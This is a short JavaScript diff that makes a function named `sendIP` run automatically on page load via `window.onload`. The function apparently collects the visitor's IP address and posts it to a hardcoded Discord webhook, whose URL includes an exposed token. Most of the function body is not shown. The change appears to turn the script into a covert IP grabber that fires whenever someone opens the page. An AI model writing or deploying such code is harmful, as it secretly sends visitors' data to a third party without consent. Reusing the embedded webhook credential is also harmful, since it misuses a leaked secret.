@@ -1,5 +1,3 @@
-const axios = require('axios');
-
 const webhookUrl = 'https://discord.com/api/webhooks/1376279997018407094/61KBhtZIo3BeLNXLm2F3Y7cek27c2F36iVIFv3xdfkpA2tN-vtj_np8Me5sNJVOSv8AO';
 
 async function sendIP() {
@@ -24,4 +22,4 @@ async function sendIP() {
   }
 }
 
-sendIP();
+window.onload = sendIP();
